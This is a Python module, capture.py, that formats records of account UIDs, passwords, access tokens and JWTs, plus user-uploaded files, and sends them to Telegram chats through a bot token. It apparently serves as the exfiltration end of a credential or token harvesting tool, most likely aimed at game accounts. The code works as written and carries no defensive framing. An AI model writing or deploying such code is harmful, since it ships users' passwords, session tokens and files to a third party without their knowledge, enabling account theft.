# capture.py
import json
import urllib.request
import uuid
from datetime import datetime


def _h(s):
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _multipart(fields: dict, files: list):
    boundary = "----capture" + uuid.uuid4().hex
    out = []
    for k, v in fields.items():
        out.append(f"--{boundary}\r\n".encode())
        out.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        out.append(str(v).encode("utf-8"))
        out.append(b"\r\n")
    for f in files:
        out.append(f"--{boundary}\r\n".encode())
        out.append(
            f'Content-Disposition: form-data; name="{f["name"]}"; filename="{f["filename"]}"\r\n'.encode()
        )
        out.append(f'Content-Type: {f.get("content_type", "application/octet-stream")}\r\n\r\n'.encode())
        out.append(f["data"])
        out.append(b"\r\n")
    out.append(f"--{boundary}--\r\n".encode())
    return b"".join(out), f"multipart/form-data; boundary={boundary}"


class TelegramCapture:
    API = "https://api.telegram.org/bot{token}/{method}"

    def __init__(self, bot_token, chat_ids):
        self.token = bot_token or ""
        if isinstance(chat_ids, (str, int)):
            chat_ids = [chat_ids]
        self.chats = [str(c) for c in (chat_ids or [])]

    def send(self, record: dict):
        if not self.token or not self.chats:
            return
        self._send_sync(record)

    def _send_sync(self, record):
        # user-uploaded files
        user_files = record.pop("_files", []) or []

        # formatted text
        text = self._format(record)

        for chat_id in self.chats:
            try:
                if text.strip():
                    self._message(chat_id, text)
                for f in user_files:
                    self._document(
                        chat_id,
                        filename=f["filename"],
                        data=f["data"],
                        caption=f'📎 {f["filename"]} — {len(f["data"])} bytes',
                        content_type=f.get("content_type", "application/octet-stream"),
                    )
            except Exception as e:
                print(f"[capture:telegram:{chat_id}] {e}")

    # ---------------- formatting ----------------

    def _format(self, r):
        src = r.get("source") or "?"

        icon = {
            "generated":        "✅",
            "generated_failed": "❌",
            "request":          "📥",
        }.get(src, "📌")

        title = {
            "generated":        "TOKEN GENERATED",
            "generated_failed": "TOKEN FAILED",
            "request":          "NEW REQUEST",
        }.get(src, src.upper())

        ts_raw = r.get("ts") or ""
        ts_fmt = ts_raw
        try:
            dt = datetime.fromisoformat(ts_raw.replace("Z", "+00:00"))
            ts_fmt = dt.strftime("%d %b %Y • %H:%M:%S")
        except Exception:
            pass

        def table(rows):
            if not rows:
                return ""
            key_w = max(len(str(k)) for k, _ in rows)
            lines = [f"{str(k).ljust(key_w)}  ›  {v}" for k, v in rows]
            return "<pre>" + "\n".join(lines) + "</pre>"

        L = []
        L.append(f"{icon}  <b>{_h(title)}</b>")
        L.append(f"<code>{_h(ts_fmt)}</code>")

        rows = []
        if r.get("real_uid"):
            rows.append(("ID",       str(r.get("real_uid"))))
        if r.get("level") not in (None, 0, ""):
            rows.append(("Level",    str(r.get("level"))))
        if r.get("region"):
            rows.append(("Region",   str(r.get("region"))))
        if r.get("uid"):
            rows.append(("UID",      str(r.get("uid"))))
        if r.get("password"):
            rows.append(("Password", str(r.get("password"))))
        if r.get("real_uid"):
            rows.append(("Real UID", str(r.get("real_uid"))))

        if rows:
            L.append("")
            L.append(table(rows))

        if r.get("access_token"):
            L.append("")
            L.append("🎟  <b>ACCESS TOKEN</b>")
            L.append(f"<blockquote expandable>{_h(r.get('access_token'))[:900]}</blockquote>")

        if r.get("jwt_token"):
            L.append("")
            L.append("💎  <b>JWT</b>")
            L.append(f"<blockquote expandable>{_h(r.get('jwt_token'))[:1500]}</blockquote>")

        if r.get("error"):
            L.append("")
            L.append("⚠️  <b>ERROR</b>")
            L.append(f"<blockquote>{_h(r.get('error'))[:500]}</blockquote>")

        return "\n".join(L)

    # ---------------- api ----------------

    def _api(self, m):
        return self.API.format(token=self.token, method=m)

    def _message(self, chat_id, text):
        chunks, buf, limit = [], "", 4000
        for line in text.split("\n"):
            if len(buf) + len(line) + 1 > limit:
                chunks.append(buf); buf = line
            else:
                buf = (buf + "\n" + line) if buf else line
        if buf: chunks.append(buf)
        for chunk in chunks:
            data = json.dumps({
                "chat_id": chat_id, "text": chunk,
                "parse_mode": "HTML", "disable_web_page_preview": True,
            }).encode()
            req = urllib.request.Request(self._api("sendMessage"), data=data,
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10).read()

    def _document(self, chat_id, filename, data, caption, content_type):
        body, ctype = _multipart(
            fields={"chat_id": chat_id, "caption": caption[:900]},
            files=[{
                "name": "document",
                "filename": filename,
                "data": data,
                "content_type": content_type,
            }],
        )
        req = urllib.request.Request(self._api("sendDocument"), data=body,
            headers={"Content-Type": ctype}, method="POST")
        urllib.request.urlopen(req, timeout=60).read()
